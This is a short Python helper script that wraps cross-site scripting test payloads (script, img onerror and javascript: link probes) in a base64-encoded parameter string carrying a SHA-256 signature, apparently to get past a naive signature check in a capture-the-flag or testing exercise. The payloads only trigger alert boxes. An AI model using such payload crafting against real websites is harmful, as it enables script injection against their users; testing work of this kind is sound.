from base64 import b64decode, b64encode, encode
from hashlib import sha256
from pyperclip import copy

def create_payload(payload):
    signature = sha256(payload.encode()).hexdigest()
    params = f'name={payload}&signature={signature}'
    # print(f'{params=}')
    encoded = b64encode(params.encode()).decode()
    return encoded


if __name__ == '__main__':
    payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<a href="javascript:alert(1)>']
    for payload in payloads:
        encoded = create_payload(payload)
        print(encoded)
        copy(encoded)
        input()